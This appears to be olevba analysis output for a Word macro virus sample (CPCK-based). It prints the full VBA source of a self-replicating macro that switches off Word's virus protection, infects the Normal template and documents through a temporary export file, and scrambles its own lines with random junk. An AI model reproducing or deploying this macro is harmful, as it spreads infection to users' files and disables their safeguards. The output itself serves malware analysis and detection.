olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-2e33f06c96dd22bc31adf33b1e127b123cccd70d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-2e33f06c96dd22bc31adf33b1e127b123cccd70d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Open()

On Error Resume Next

UK82 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

Options.ConfirmConversions = 0

Options.VirusProtection = 0

Options.SaveNormalPrompt = 0

Application.EnableCancelKey = 0

DM98 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

Set BF19 = ActiveDocument.VBProject.VBComponents.Item(1)

PG76 = True

End If

If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

Set BF19 = NormalTemplate.VBProject.VBComponents.Item(1)

NS60 = True

End If

If NS60 = True Then

ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\" & Application.UserInitials

BF19.CodeModule.AddFromFile ("c:\" & Application.UserInitials)

BF19.CodeModule.deletelines 1, 4

BF19.CodeModule.replaceline 1, "Sub Document_Close()"

ElseIf PG76 = True Then

BF19.CodeModule.AddFromFile ("c:\" & Application.UserInitials)

BF19.CodeModule.deletelines 1, 4

End If

With BF19.CodeModule

For x = 2 To (BF19.CodeModule.CountOfLines - 1) Step 2

.replaceline x, (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " = " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " + " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22)))

Next x

End With

NG48:

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

